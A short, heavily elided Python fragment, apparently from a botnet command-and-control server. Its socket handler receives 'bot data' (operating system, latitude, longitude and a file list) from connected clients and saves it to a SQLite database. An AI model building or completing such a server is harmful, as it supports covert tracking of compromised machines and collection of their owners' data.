...
def socket_handler():
    ...
    while True:
        ...
        try:
            ...
            os_info, lat, lon = metadata.split('|')
            files = client_socket.recv(4096).decode('utf-8')  # Receive the file list

            # Save bot data to the database
            with sqlite3.connect(DATABASE) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                ...
                """, (ip, os_info, lat, lon, 'Online', files))
                conn.commit()
